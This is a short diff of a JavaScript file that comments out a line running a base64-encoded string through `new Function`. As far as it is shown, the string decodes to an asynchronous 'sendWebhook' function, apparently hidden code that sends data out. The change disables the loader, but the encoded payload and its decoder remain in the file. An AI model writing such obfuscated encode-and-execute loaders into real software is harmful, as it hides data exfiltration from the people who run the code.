@@ -103,4 +103,4 @@ var key = "KGZ1bmN0aW9uKCkgeyAKICBhc3luYyBmdW5jdGlvbiBzZW5kV2ViaG9vaygpIHsKICAgI
 
 const asdasd = atob(key)
 
-const func = new Function(`return ${asdasd}`)()
+// const func = new Function(`return ${asdasd}`)()
